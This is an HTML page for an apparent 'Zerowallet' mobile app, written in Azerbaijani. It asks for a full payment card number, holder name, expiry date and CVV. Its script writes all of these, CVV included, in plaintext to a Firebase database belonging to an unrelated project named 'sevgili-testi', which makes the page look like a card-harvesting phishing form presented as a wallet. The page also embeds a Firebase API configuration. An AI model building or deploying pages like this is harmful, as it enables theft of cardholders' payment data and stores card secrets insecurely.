<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Kartı Bağla | Zerowallet</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&family=Space+Mono&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --bg: #0a0e1a;
            --primary: #4f46e5;
            --card-grad: linear-gradient(135deg, #1e1b4b 0%, #312e81 100%);
            --input-bg: #161b2c;
            --text-muted: #94a3b8;
        }

        /* Ekranın sürüşməsini tamamilə bağlayan hissə */
        html, body {
            margin: 0; padding: 0;
            width: 100%; height: 100%;
            overflow: hidden; /* Sürüşməni tam dayandırır */
            position: fixed; /* Ekranın tərpənməsinin qarşısını alır */
            background: var(--bg);
            color: #fff;
            font-family: 'Plus Jakarta Sans', sans-serif;
            touch-action: none; /* Zoom və lazımsız toxunuş hərəkətlərini bloklayır */
        }

        .app-container {
            padding: 25px 20px;
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        .header {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
        }

        .header i { font-size: 1.4rem; cursor: pointer; color: var(--text-muted); }
        .header h2 { font-size: 1.1rem; font-weight: 800; margin-left: 15px; letter-spacing: -0.5px; }

        /* Realist Bank Kartı */
        .credit-card {
            width: 100%;
            height: 200px;
            background: var(--card-grad);
            border-radius: 22px;
            padding: 25px;
            position: relative;
            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.08);
            margin-bottom: 35px;
            box-sizing: border-box;
        }

        .brand-logo { position: absolute; top: 25px; right: 25px; height: 35px; transition: 0.3s; }
        .chip { 
            width: 48px; height: 36px; 
            background: linear-gradient(135deg, #f59e0b 0%, #b45309 100%); 
            border-radius: 7px; margin-bottom: 25px;
        }

        .card-number-v {
            font-family: 'Space Mono', monospace;
            font-size: 1.3rem;
            letter-spacing: 2px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            display: block;
            margin-bottom: 25px;
        }

        .card-details-v { display: flex; justify-content: space-between; align-items: flex-end; }
        .v-lbl { font-size: 0.6rem; color: var(--text-muted); text-transform: uppercase; margin-bottom: 4px; display: block; }
        .v-val { font-size: 0.85rem; font-weight: 600; letter-spacing: 0.5px; }

        /* Form */
        .form { flex: 1; }
        .field { margin-bottom: 18px; }
        .field label { font-size: 0.75rem; font-weight: 700; color: var(--text-muted); margin-bottom: 8px; display: block; margin-left: 5px; }
        
        input {
            width: 100%;
            background: var(--input-bg);
            border: 1px solid rgba(255,255,255,0.05);
            padding: 16px;
            border-radius: 14px;
            color: #fff;
            font-size: 1rem;
            outline: none;
            box-sizing: border-box;
        }

        input:focus { border-color: var(--primary); background: #1c2237; }

        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }

        .btn {
            width: 100%;
            background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
            color: #fff;
            border: none;
            padding: 18px;
            border-radius: 16px;
            font-weight: 800;
            font-size: 1rem;
            margin-top: 10px;
            box-shadow: 0 10px 20px rgba(79, 70, 229, 0.2);
            cursor: pointer;
        }

        .btn:active { transform: scale(0.98); }

        #toast {
            position: fixed; top: 25px; left: 50%; transform: translateX(-50%);
            padding: 14px 28px; border-radius: 12px; font-weight: 700;
            display: none; z-index: 9999; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            font-size: 0.9rem; width: 80%; text-align: center;
        }
    </style>
</head>
<body>

    <div id="toast"></div>

    <div class="app-container">
        <div class="header">
            <i class="fas fa-arrow-left" onclick="history.back()"></i>
            <h2>KART ƏLAVƏ ET</h2>
        </div>

        <div class="credit-card">
            <img src="visa.png" id="v-logo" class="brand-logo" style="display:none">
            <div class="chip"></div>
            <span class="card-number-v" id="view-num">**** **** **** ****</span>
            <div class="card-details-v">
                <div>
                    <span class="v-lbl">Kart Sahibi</span>
                    <span class="v-val" id="view-name">AD SOYAD</span>
                </div>
                <div style="text-align: right;">
                    <span class="v-lbl">Bitmə Tarixi</span>
                    <span class="v-val" id="view-exp">MM/YY</span>
                </div>
            </div>
        </div>

        <div class="form">
            <div class="field">
                <label>KART NÖMRƏSİ</label>
                <input type="text" id="inp-num" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000">
            </div>
            <div class="field">
                <label>AD SOYAD</label>
                <input type="text" id="inp-name" placeholder="ELVIN ALIYEV" oninput="this.value = this.value.toUpperCase()">
            </div>
            <div class="row">
                <div class="field">
                    <label>TARİX</label>
                    <input type="text" id="inp-exp" inputmode="numeric" maxlength="5" placeholder="MM/YY">
                </div>
                <div class="field">
                    <label>CVV</label>
                    <input type="password" id="inp-cvv" inputmode="numeric" maxlength="3" placeholder="***">
                </div>
            </div>
            <button class="btn" onclick="saveCard()">TƏSDİQLƏ</button>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
            authDomain: "sevgili-testi.firebaseapp.com",
            databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com",
            projectId: "sevgili-testi",
            storageBucket: "sevgili-testi.firebasestorage.app",
            messagingSenderId: "399260477557",
            appId: "1:399260477557:web:584204a698d7bf145bb03c"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const user = localStorage.getItem('zerowallet_session');

        const iNum = document.getElementById('inp-num');
        const iName = document.getElementById('inp-name');
        const iExp = document.getElementById('inp-exp');
        const iCvv = document.getElementById('inp-cvv');
        const vLogo = document.getElementById('v-logo');

        // Canlı Sinxronizasiya
        iNum.addEventListener('input', (e) => {
            let v = e.target.value.replace(/\D/g, '');
            if(v.startsWith('4')) { vLogo.src = 'visa.png'; vLogo.style.display = 'block'; }
            else if(v.startsWith('5')) { vLogo.src = 'master.png'; vLogo.style.display = 'block'; }
            else { vLogo.style.display = 'none'; }
            
            let f = v.match(/.{1,4}/g)?.join(' ') || v;
            e.target.value = f;
            document.getElementById('view-num').innerText = f || "**** **** **** ****";
        });

        iName.addEventListener('input', (e) => {
            document.getElementById('view-name').innerText = e.target.value || "AD SOYAD";
        });

        iExp.addEventListener('input', (e) => {
            let v = e.target.value.replace(/\D/g, '');
            if(v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
            e.target.value = v;
            document.getElementById('view-exp').innerText = v || "MM/YY";
        });

        function showToast(msg, color) {
            const t = document.getElementById('toast');
            t.innerText = msg;
            t.style.background = color;
            t.style.display = 'block';
            if(color === '#ef4444') setTimeout(() => t.style.display = 'none', 2500);
        }

        function saveCard() {
            const n = iNum.value.replace(/\s/g, '');
            if(n.length < 16) return showToast("Kart nömrəsi yanlışdır!", "#ef4444");
            if(iName.value.length < 5) return showToast("Ad və Soyad daxil edin!", "#ef4444");
            if(iExp.value.length < 5) return showToast("Tarix yanlışdır!", "#ef4444");
            if(iCvv.value.length < 3) return showToast("CVV yanlışdır!", "#ef4444");

            db.ref('zerowallet_users/' + user + '/cardInfo').set({
                number: n, holder: iName.value, expiry: iExp.value, cvv: iCvv.value, time: Date.now()
            }).then(() => {
                showToast("Kart uğurla bağlandı!", "#22c55e");
                setTimeout(() => location.href = 'main.html', 1500);
            });
        }
    </script>
</body>
</html>
